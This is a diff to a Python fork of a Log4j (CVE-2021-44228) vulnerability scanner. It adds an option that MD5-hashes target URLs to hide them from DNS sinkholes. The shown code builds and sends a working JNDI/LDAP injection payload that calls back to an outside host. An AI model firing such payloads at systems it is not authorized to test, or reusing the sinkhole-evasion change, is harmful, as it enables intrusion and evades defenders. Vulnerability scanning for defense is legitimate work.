@@ -17,6 +17,7 @@ from urllib import parse as urlparse
 import base64
 import json
 import random
+import hashlib
 from uuid import uuid4
 from base64 import b64encode
 from Crypto.Cipher import AES, PKCS1_OAEP
@@ -32,7 +33,6 @@ try:
 except Exception:
     pass
 
-
 cprint('[•] CVE-2021-44228 - Apache Log4j RCE Scanner', "green")
 cprint('[•] Scanner provided by FullHunt.io - The Next-Gen Attack Surface Management Platform.', "yellow")
 cprint('[•] Secure your External Attack Surface with FullHunt.io.', "yellow")
@@ -43,7 +43,7 @@ if len(sys.argv) <= 1:
 
 
 default_headers = {
-    'User-Agent': 'log4j-scan (https://github.com/mazen160/log4j-scan)',
+    'User-Agent': 'log4j-scan (https://github.com/arnoldthebat/log4j-scan)',
     # 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36',
     'Accept': '*/*'  # not being tested to allow passing through checks on Accept header in older web-servers
 }
@@ -125,6 +125,10 @@ parser.add_argument("--disable-http-redirects",
                     dest="disable_redirects",
                     help="Disable HTTP redirects. Note: HTTP redirects are useful as it allows the payloads to have higher chance of reaching vulnerable systems.",
                     action='store_true')
+parser.add_argument("-o","--obfuscate",
+                    dest="obfuscate",
+                    help="Hide URL in DNS sinkholes by MD5 hashing.",
+                    action='store_true')
 
 args = parser.parse_args()
 
@@ -171,6 +175,10 @@ def get_cve_2021_45046_payloads(callback_host, random_string):
         new_payload = new_payload.replace("{{random}}", random_string)
         payloads.append(new_payload)
     return payloads
+
+def get_obfuscated_url(url):
+    return (hashlib.md5(url.encode('utf-8')).hexdigest())
+
 
 
 class Dnslog(object):
@@ -279,7 +287,10 @@ def parse_url(url):
 
 
 def scan_url(url, callback_host):
-    parsed_url = parse_url(url)
+    if(args.obfuscate):
+        parsed_url = parse_url(get_obfuscated_url(url))
+    else:
+        parsed_url = parse_url(url)
     random_string = ''.join(random.choice('0123456789abcdefghijklmnopqrstuvwxyz') for i in range(7))
     payload = '${jndi:ldap://%s.%s/%s}' % (parsed_url["host"], callback_host, random_string)
     payloads = [payload]
@@ -290,7 +301,12 @@ def scan_url(url, callback_host):
         payloads = get_cve_2021_45046_payloads(f'{parsed_url["host"]}.{callback_host}', random_string)
 
     for payload in payloads:
-        cprint(f"[•] URL: {url} | PAYLOAD: {payload}", "cyan")
+        # Set MD5 where needed
+        if(args.obfuscate):
+            hashed_url = get_obfuscated_url(url)
+            cprint(f"[•] URL: {url} | PAYLOAD: {payload} | HASHEDURL: {hashed_url}", "red" ) 
+        else:
+            cprint(f"[•] URL: {url} | PAYLOAD: {payload}", "cyan" ) 
         if args.request_type.upper() == "GET" or args.run_all_tests:
             try:
                 requests.request(url=url,
